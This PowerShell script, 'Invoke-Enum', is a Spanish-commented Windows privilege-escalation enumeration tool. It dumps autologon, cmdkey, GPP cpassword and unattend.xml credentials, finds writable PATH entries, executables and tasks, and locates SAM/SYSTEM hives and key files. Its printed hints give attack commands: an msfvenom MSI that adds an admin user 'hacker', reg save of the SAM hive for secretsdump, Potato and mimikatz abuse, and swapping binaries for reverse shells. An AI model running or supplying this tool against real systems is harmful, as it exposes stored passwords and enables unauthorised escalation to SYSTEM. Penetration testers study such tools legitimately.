#encoding: UTF-8
Write-Host "======== Invoke-Enum v1.0========" -ForegroundColor Cyan

function Show-Section($txt) {
    Write-Host "`n======================= $txt =======================" -ForegroundColor Magenta
}
function Safe-ACL($path) { try { return Get-Acl $path } catch { return $null } }
function Safe-Child($p, $filter) { try { return Get-ChildItem -Path $p -Recurse -Filter $filter -ErrorAction SilentlyContinue } catch { return @() } }
function Safe-Props($key) { try { return Get-ItemProperty -Path $key -ErrorAction SilentlyContinue } catch { return $null } }

$ErrorActionPreference = "SilentlyContinue"

# ================= Información del Sistema =================
Show-Section "Información del Sistema"

function Safe-Get {
    param (
        [ScriptBlock]$Primary,
        [ScriptBlock]$Fallback
    )
    Try {
        & $Primary
    } Catch {
        & $Fallback
    }
}

Try {
    $os = Safe-Get { Get-CimInstance Win32_OperatingSystem } { Get-WmiObject Win32_OperatingSystem }
    $cs = Safe-Get { Get-CimInstance Win32_ComputerSystem } { Get-WmiObject Win32_ComputerSystem }
    $patches = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5

    Write-Host "Nombre del sistema operativo: $($os.Caption)" -ForegroundColor Cyan
    Write-Host "Versión: $($os.Version) - Build $($os.BuildNumber)" -ForegroundColor Cyan
    Write-Host "Arquitectura: $($os.OSArchitecture)" -ForegroundColor Cyan
    Write-Host "Idioma del sistema: $($os.MUILanguages -join ', ')" -ForegroundColor Cyan
    Write-Host "Usuario actual: $env:USERNAME" -ForegroundColor Cyan
    Write-Host "Nombre del host: $env:COMPUTERNAME" -ForegroundColor Cyan
    Write-Host "Fabricante: $($cs.Manufacturer)" -ForegroundColor Cyan
    Write-Host "Modelo: $($cs.Model)" -ForegroundColor Cyan

    $installDate = $os.InstallDate
    if ($installDate -is [string]) {
        $installDate = [Management.ManagementDateTimeConverter]::ToDateTime($installDate)
    }
    Write-Host "Fecha de instalación: $installDate" -ForegroundColor Cyan

    $bootTime = $os.LastBootUpTime
    if ($bootTime -is [string]) {
        $bootTime = [Management.ManagementDateTimeConverter]::ToDateTime($bootTime)
    }
    Write-Host "Último reinicio: $bootTime" -ForegroundColor Cyan

    Write-Host "`nÚltimos parches instalados:" -ForegroundColor Yellow
    foreach ($p in $patches) {
        Write-Host "  - $($p.HotFixID) instalado el $($p.InstalledOn)" -ForegroundColor White
    }
}
Catch {
    Write-Host "[!] Error al obtener información del sistema." -ForegroundColor Red
}


# ================= USUARIOS Y PRIVILEGIOS =================
Show-Section "Usuarios y Privilegios"
Try { net user } catch {}
Try { net localgroup Administradores } catch {}
Try { whoami /priv } catch {}

# ================= ALWAYSINSTALL ELEVATED =================
Show-Section "AlwaysInstallElevated"
Write-Host "[*] POC: Si ambas claves valen 1, puedes ejecutar MSI como SYSTEM"
Write-Host "[+] Exploit: msfvenom -p windows/adduser USER=hacker PASS=123456 -f msi > evil.msi"
Write-Host "[+] Ejecutar: msiexec /quiet /qn /i evil.msi"
Try { reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated } catch {}
Try { reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated } catch {}

# ================= AUTOLOGON =================
Show-Section "Autologon"
Write-Host "[*] POC: Puede revelar usuario y contrasena configurados para login automatico"
Write-Host "[+] Exploit: Extraer DefaultUserName y DefaultPassword y loguearte localmente"
Try { reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr Default } catch {}

# ================= CMDKEY =================
Show-Section "Credenciales (cmdkey)"
Write-Host "[*] POC: Lista credenciales almacenadas para conexiones remotas"
Write-Host "[+] Exploit: Usar cmdkey /list y luego runas /savecred para ejecutar como otro usuario"
Try { cmdkey /list } catch {}

# ================= TOKENS PRIVILEGIADOS =================
Show-Section "Tokens Privilegiados"
$tokens = @("SeAssignPrimaryTokenPrivilege","SeImpersonatePrivilege","SeBackupPrivilege","SeRestorePrivilege",
"SeTakeOwnershipPrivilege","SeDebugPrivilege","SeLoadDriverPrivilege","SeTcbPrivilege",
"SeManageVolumePrivilege","SeCreateTokenPrivilege")
Try {
    $privs = whoami /priv
    foreach ($t in $tokens) {
        if ($privs -match $t) {
            Write-Host "[!] Token detectado: $t" -ForegroundColor Red
            switch ($t) {
                "SeImpersonatePrivilege" { Write-Host "[+] Exploit: Usar PrintSpoofer, RoguePotato, JuicyPotato para escalar a SYSTEM" -ForegroundColor Cyan }
                "SeAssignPrimaryTokenPrivilege" { Write-Host "[+] Exploit: Crear proceso con token primario (S4U o abuso de servicio)" -ForegroundColor Cyan }
                "SeDebugPrivilege" { Write-Host "[+] Exploit: Inyectar procesos SYSTEM (ej: con mimikatz o ProcessHacker)" -ForegroundColor Cyan }
                "SeBackupPrivilege" { Write-Host "[+] Exploit: Leer SAM/SYSTEM con 'reg save'" -ForegroundColor Cyan }
                "SeRestorePrivilege" { Write-Host "[+] Exploit: Restaurar archivos protegidos o reemplazar binarios" -ForegroundColor Cyan }
                "SeTakeOwnershipPrivilege" { Write-Host "[+] Exploit: Tomar propiedad con 'takeown' y cambiar ACL con 'icacls'" -ForegroundColor Cyan }
                "SeLoadDriverPrivilege" { Write-Host "[+] Exploit: Cargar drivers maliciosos si no hay control de firmas" -ForegroundColor Cyan }
                "SeTcbPrivilege" { Write-Host "[+] Exploit: Actuar como subsistema confiable (muy potente, raro de explotar)" -ForegroundColor Cyan }
                "SeManageVolumePrivilege" { Write-Host "[+] Exploit: Leer disco crudo o montar volumenes manualmente" -ForegroundColor Cyan }
                "SeCreateTokenPrivilege" { Write-Host "[+] Exploit: Crear tokens arbitrarios. Requiere tecnicas avanzadas" -ForegroundColor Cyan }
            }
        }
    }
} catch {}


# ================= Environment PATH - DLL Hijack =================
Show-Section "Variables de entorno PATH y rutas hijackables"
Write-Host "`n[?] Tal vez puedas abusar de modificar/crear un binario o DLL en alguna de las siguientes rutas del PATH:"
Write-Host "[+] Verificar la ruta del binario: sc.exe qc dllsvc"

Try {
    $user = "$env:USERNAME"
    $pathDirs = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) }

    foreach ($path in $pathDirs) {
        Try {
            $acl = Get-Acl $path
            foreach ($entry in $acl.Access) {
                if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                    ($entry.FileSystemRights.ToString() -match "Write|Modify|FullControl")) {

                    # Salida tipo winPEAS con resumen
                    Write-Host "`n[*] Hijackable PATH Entry: $path" -ForegroundColor Yellow
                    Write-Host "    Usuario: $($entry.IdentityReference) Permiso: $($entry.FileSystemRights)" -ForegroundColor Green
                    Write-Host "[!] Possible DLL Hijacking in: $path [$($entry.IdentityReference): $($entry.FileSystemRights)]" -ForegroundColor Red
                    Write-Host "======================================================================================" -ForegroundColor DarkGray
                }
            }
        } Catch {
            Write-Host "    [!] No se pudo evaluar permisos para: $path" -ForegroundColor DarkGray
        }
    }
}
Catch {
    Write-Host "[!] Error general al procesar variables de entorno." -ForegroundColor Red
}


# ================= AUTORUNS - MODIFICABLES =================
Show-Section "Autoruns - Ejecutables con posibles modificaciones"
Write-Host "[*] POC: Claves Run pueden contener rutas a ejecutables controlables"
Write-Host "[+] Exploit: Modificar ruta de ejecutable o reemplazar binario si hay permisos"
$runKeys = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run")
foreach ($key in $runKeys) {
    $props = Safe-Props $key
    if ($props) {
        $props.PSObject.Properties | ForEach-Object {
            if ($_.Value -match ".exe") {
                Write-Host "[Autorun] $($_.Name): $($_.Value)" -ForegroundColor Yellow
            }
        }
    }
}

# ================= TAREAS PROGRAMADAS =================
Show-Section "Tareas programadas del usuario (no-Microsoft)"
Write-Host "[*] POC: Las tareas pueden ejecutarse automáticamente con permisos elevados"
Write-Host "[+] Exploit:"
Write-Host "  1. Buscar tareas que se ejecuten como SYSTEM o con RunLevel=Highest"
Write-Host "  2. Verificar si el binario asociado es modificable por el usuario actual"
Write-Host "  3. Si es modificable, reemplazar por binario malicioso y esperar ejecución"

Try {
    Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } |
        Format-Table TaskName, TaskPath, State -AutoSize
}
Catch {
    Write-Host "[!] Error procesando tareas con Get-ScheduledTask" -ForegroundColor DarkGray
}

Try {
    $lines = schtasks /query /fo LIST /v | findstr '\"' | findstr /V /R "\\Microsoft"
    $shown = @{}

    foreach ($line in $lines) {
        if ($line -match '^Tarea que se ejecutar.*?:\s+(.*)$') {
            $exe = $matches[1].Trim()
            if (-not $shown.ContainsKey($exe)) {
                $shown[$exe] = $true
                Write-Host "[*] Ejecutable: $exe" -ForegroundColor Yellow
            }
        }
    }
} Catch {
    Write-Host "[!] Error ejecutando schtasks" -ForegroundColor DarkGray
}



# ======================= Puertos abiertos + servicios =======================
Show-Section "Puertos abiertos + servicios"
Write-Host "[*] POC: Mostrar procesos que escuchan en puertos locales"
Write-Host "[+] Exploit: Identificar servicios vulnerables accesibles por red local o remota"

Try {
    $unique = @{}
    netstat -aon | findstr LISTENING | ForEach-Object {
        $line = ($_ -replace '\s+', ' ').Trim()
        $parts = $line.Split(' ')
        if ($parts.Length -ge 5) {
            $proto = $parts[0]
            $local = $parts[1]
            $mypid = $parts[-1]
            $port = ($local.Split(':')[-1]) -replace '[^\d]', ''

            if (-not $unique.ContainsKey($mypid)) {
                try {
                    $proc = (Get-Process -Id $mypid -ErrorAction Stop).ProcessName
                } catch {
                    $proc = "Desconocido"
                }

                $unique[$mypid] = [PSCustomObject]@{
                    Protocolo = $proto
                    Puerto    = $port
                    Proceso   = $proc
                    PID       = $mypid
                }
            }
        }
    }

    $unique.Values | Sort-Object Puerto | Format-Table -AutoSize
} catch {
    Write-Host "[!] Error al obtener puertos y procesos" -ForegroundColor Red
}

# ================= BUSQUEDA EXTENSIVA =================
Show-Section "Busqueda extensiva forzada (solo FULLCONTROL Users/Everyone)"

Write-Host "[*] POC: Ejecutables con permisos FULLCONTROL para Everyone o Users pueden ser sustituidos maliciosamente"
Write-Host "[+] Exploit:"
Write-Host "  1. Busca binarios *.exe modificables ubicados fuera de system32"
Write-Host "  2. Inyecta tu payload (por ejemplo un reverse shell o add admin)"
Write-Host "  3. Espera ejecución por parte de un proceso privilegiado (servicio, login script, etc.)"

$excludedFolders = @("C:\Windows", "C:\PerfLogs", "C:\Symbols")

function IsExcluded {
    param($path)
    foreach ($exclude in $excludedFolders) {
        if ($path -like "$exclude*") { return $true }
    }
    return $false
}

Try {
    Get-ChildItem -Path "C:\" -File -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {
        $_.Extension -eq ".exe" -and (-not (IsExcluded $_.FullName))
    } | ForEach-Object {
        $acl = Safe-ACL $_.FullName
        if ($acl) {
            foreach ($entry in $acl.Access) {
                if ($entry.IdentityReference -match "Users|Everyone" -and `
                    $entry.FileSystemRights.ToString() -eq "FullControl") {
                    Write-Host "[+] Ejecutable vulnerable: $($_.FullName)" -ForegroundColor Red
                    Write-Host "    Usuario : $($entry.IdentityReference)" -ForegroundColor Yellow
                    Write-Host "    Permisos: $($entry.FileSystemRights)" -ForegroundColor Green
                }
            }
        }
    }
}
Catch {
    Write-Host "[!] Error durante la búsqueda extensiva." -ForegroundColor DarkGray
}



# ================= PROGRAMAS INSTALADOS =================
Show-Section "Aplicaciones instaladas de terceros (no Windows)"
Write-Host "[*] POC: Aplicaciones no Microsoft pueden tener vulnerabilidades locales"
Write-Host "[+] Exploit: Verificar versiones vulnerables con searchsploit o CVE DB"
Try {
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Where-Object { $_.DisplayName -and $_.DisplayName -notmatch "Microsoft|Windows" } |
    ForEach-Object {
        Write-Host "[+] $($_.DisplayName) - $($_.DisplayVersion)" -ForegroundColor Cyan
    }
} catch {}

# ================= SERVICIOS CON VERSION =================
Show-Section "Servicios con version de binario"
Write-Host "[*] POC: Ver versiones para detectar binarios desactualizados o con CVEs conocidos"
Write-Host "[+] Exploit: Buscar el hash o nombre del servicio en searchsploit / vulndb"
Try {
    Get-WmiObject Win32_Service | ForEach-Object {
        $path = $_.PathName -replace '"',''
        if (Test-Path $path) {
            Try {
                $ver = (Get-Item $path).VersionInfo.FileVersion
                Write-Host "[Servicio] $($_.Name) => $ver" -ForegroundColor Cyan
            } catch {}
        }
    }
} catch {}



# ================= Archivos Ejecutables Modificables =================
Show-Section "Archivos ejecutables/scripting con permisos WRITE"

Write-Host "[*] POC: Archivos que pueden ser reemplazados o modificados para ejecución automática"
Write-Host "[+] Exploit: Reemplazar payloads (.exe, .bat, .dll, .ps1, etc.) y abusar ejecución"

$extensions = @(".exe", ".bat", ".cmd", ".ps1", ".vbs", ".dll", ".msi")
$excludePaths = @("C:\Windows", "C:\PerfLogs")

function IsExcluded {
    param($path)
    foreach ($exclude in $excludePaths) {
        if ($path -like "$exclude*") { return $true }
    }
    return $false
}

Try {
    Get-ChildItem -Path "C:\" -Recurse -Force -File -ErrorAction SilentlyContinue | Where-Object {
        $ext = $_.Extension.ToLower()
        ($extensions -contains $ext) -and (-not (IsExcluded $_.FullName))
    } | ForEach-Object {
        $acl = Safe-ACL $_.FullName
        if ($acl) {
            foreach ($entry in $acl.Access) {
                if ($entry.IdentityReference -match "Users|Everyone|Authenticated Users" -and `
                    $entry.FileSystemRights.ToString() -match "Write|Modify|FullControl") {
                    Write-Host "[!] Archivo vulnerable: $($_.FullName)" -ForegroundColor Red
                    Write-Host "    Usuario: $($entry.IdentityReference)" -ForegroundColor Yellow
                    Write-Host "    Permisos: $($entry.FileSystemRights)" -ForegroundColor Green
                    Write-Host "======================================================================================" -ForegroundColor DarkGray
                }
            }
        }
    }
}
Catch {
    Write-Host "[!] Error al enumerar archivos modificables." -ForegroundColor DarkGray
}




# ================= SAM & SYSTEM HIVES =================
Show-Section "SAM & SYSTEM Hives Profundos"
Write-Host "[*] POC: Dump de hives permite extraer hashes de usuarios locales"
Write-Host "[+] Exploit manual: reg save HKLM\\SAM C:\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Temp\\system.save"
Write-Host "[+] Analizar con: secretsdump.py -sam sam.save -system system.save LOCAL"

$hives = @("SAM", "SYSTEM")
$dirs = @("C:\Windows\Repair", "C:\Windows\System32\config", "C:\")

foreach ($h in $hives) {
    foreach ($d in $dirs) {
        $f = "$d\$h"
        if (Test-Path $f) {
            Write-Host "[+] Hive encontrado: $f" -ForegroundColor Cyan
        }
    }
}



# ================= GPP - Groups.xml =================
Show-Section "GPP - Groups.xml"

Write-Host "[*] POC: Claves cpassword en XML permiten recuperar contraseñas"
Write-Host "[+] Exploit: Usar GPPDecrypter para descifrar la contraseña"

Try {
    Get-ChildItem -Path "C:\*" -Filter "Groups.xml" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
        Write-Host "`n[*] Encontrado: $($_.FullName)" -ForegroundColor Red
        Try {
            Get-Content $_.FullName | Select-String "cpassword" | ForEach-Object {
                Write-Host "    $_" -ForegroundColor Yellow
            }
        } Catch {
            Write-Host "    [!] No se pudo leer el contenido del archivo." -ForegroundColor DarkGray
        }
    }
}
Catch {
    Write-Host "[!] Error general al buscar Groups.xml" -ForegroundColor DarkGray
}


# ================= ARCHIVOS UNATTENDED =================
Show-Section "Archivos Unattended"

Write-Host "[*] POC: Archivos XML pueden contener contraseñas en texto plano"
Write-Host "[+] Exploit: Buscar Password y usarla con runas, psexec o SMB"

$files = @("unattend.xml", "sysprep.xml", "autounattend.xml")
$dirs = @("C:\")
$seenPaths = @{}

foreach ($d in $dirs) {
    foreach ($f in $files) {
        Try {
            $found = Get-ChildItem -Path "$d*" -Filter $f -Recurse -Force -ErrorAction SilentlyContinue
            foreach ($fnd in $found) {
                if (-not $seenPaths.ContainsKey($fnd.FullName)) {
                    $seenPaths[$fnd.FullName] = $true
                    Write-Host "`n[!] $($fnd.FullName)" -ForegroundColor Yellow
                    Try {
                        $lines = Get-Content $fnd.FullName
                        $insideBlock = $false
                        foreach ($line in $lines) {
                            if ($line -match "<Password>") {
                                $insideBlock = $true
                            }

                            if ($insideBlock) {
                                Write-Host "    $line" -ForegroundColor Green
                            }

                            if ($line -match "</Password>") {
                                $insideBlock = $false
                            }

                            if ($line -match "<Username>|<Enabled>") {
                                Write-Host "    $line" -ForegroundColor Cyan
                            }
                        }
                    } Catch {
                        Write-Host "    [!] No se pudo leer el archivo." -ForegroundColor DarkGray
                    }
                }
            }
        } Catch {}
    }
}


# ================= Archivos Sensibles en Disco =================
Show-Section "Archivos Sensibles en Disco"

$sensitiveExts = @(
    "*.pem", "*.key", "*.pfx", "*.kdbx", "*.sql", "*.bak", "*.db", "*.sqlite",
    "*.config", "*.ini", "*.keytab", "*.rdp", "*.ovpn", ".aws", ".azureProfile.json"
)

$searchDirs = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:APPDATA",
    "$env:LOCALAPPDATA",
    "C:\Program Files",
    "C:\Program Files (x86)",
    "C:\", "D:\", "E:\"
)

$reportedPaths = [System.Collections.Generic.HashSet[string]]::new()

foreach ($dir in $searchDirs) {
    foreach ($ext in $sensitiveExts) {
        try {
            $found = Get-ChildItem -Path $dir -Filter $ext -Recurse -ErrorAction SilentlyContinue -Force
            foreach ($file in $found) {
                $path = $file.FullName

                # Excluir cualquier ruta que contenga 'Microsoft' o 'Windows' (insensible a mayúsculas)
                if ($path -match "(?i)Microsoft|Windows") {
                    continue
                }

                if (-not $reportedPaths.Contains($path)) {
                    $reportedPaths.Add($path) | Out-Null
                    Write-Host "[!] Posible archivo sensible: $path" -ForegroundColor Yellow
                }
            }
        } catch {
            continue
        }
    }
}
